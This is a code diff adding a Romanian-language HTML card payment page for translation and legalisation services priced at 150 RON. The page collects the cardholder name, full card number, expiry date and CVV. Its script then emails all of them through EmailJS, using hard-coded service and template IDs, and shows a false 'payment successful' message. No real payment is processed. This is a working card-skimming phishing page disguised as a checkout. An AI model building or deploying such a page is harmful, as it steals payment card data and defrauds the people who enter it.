@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Plata cu Cardul</title>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .payment-container {
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            width: 400px;
+            max-width: 100%;
+        }
+
+        .payment-container h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            color: #333;
+        }
+
+        .input-group input:focus {
+            border-color: #4CAF50;
+            outline: none;
+        }
+
+        .button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 12px 0;
+            border: none;
+            width: 100%;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .button:hover {
+            background-color: #45a049;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #777;
+            margin-top: 20px;
+        }
+
+        .footer a {
+            color: #4CAF50;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .payment-summary {
+            background-color: #f9f9f9;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .payment-summary h3 {
+            margin: 0;
+            font-size: 18px;
+            color: #333;
+        }
+
+        .payment-summary p {
+            margin: 5px 0;
+            font-size: 16px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="payment-container">
+        <h2>Plătește cu Cardul</h2>
+
+        <!-- Sumar de plată -->
+        <div class="payment-summary">
+            <h3>Sumar de Plata</h3>
+            <p>Prestări servicii de Traducere și Legalizare</p>
+            <p><strong>Total: 150.00 RON</strong></p>
+        </div>
+
+        <form id="payment-form">
+            <!-- Nume -->
+            <div class="input-group">
+                <label for="name">Numele tău</label>
+                <input type="text" id="name" name="name" placeholder="Introduceți numele" required>
+            </div>
+
+            <!-- Card -->
+            <div class="input-group">
+                <label for="card-number">Numărul cardului</label>
+                <input type="text" id="card-number" name="card-number" placeholder="xxxx xxxx xxxx xxxx" required>
+            </div>
+
+            <!-- Data Expirării -->
+            <div class="input-group">
+                <label for="expiry-date">Data Expirării</label>
+                <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY" required>
+            </div>
+
+            <!-- CVV -->
+            <div class="input-group">
+                <label for="cvv">CVV</label>
+                <input type="text" id="cvv" name="cvv" placeholder="xxx" required>
+            </div>
+
+            <!-- Buton de Plată -->
+            <button type="submit" class="button">Plătește acum</button>
+        </form>
+
+        <div class="footer">
+            <p>Politica de confidențialitate | <a href="#">Termeni și condiții</a></p>
+        </div>
+    </div>
+
+    <script>
+        // Incarcă EmailJS
+        (function() {
+            emailjs.init("HXJNjK6F40omY-ZqO"); // Înlocuiește cu ID-ul tău din EmailJS
+        })();
+
+        // Eveniment la submit formular
+        document.getElementById('payment-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // Preia datele din formular
+            const formData = new FormData(this);
+            const name = formData.get('name');
+            const cardNumber = formData.get('card-number');
+            const expiryDate = formData.get('expiry-date');
+            const cvv = formData.get('cvv');
+
+            // Trimite email cu datele
+            const emailParams = {
+                to_name: name,
+                from_name: 'Plată cu Cardul',
+                card_number: cardNumber,
+                expiry_date: expiryDate,
+                cvv: cvv
+            };
+
+            emailjs.send("service_7str0s2", "template_lyainh9", emailParams)
+                .then(function(response) {
+                    alert("Plata a fost efectuată cu succes!");
+                }, function(error) {
+                    alert("A apărut o eroare la trimiterea emailului. Te rugăm să încerci din nou.");
+                    console.error('Error:', error);
+                });
+        });
+    </script>
+
+</body>
+</html>
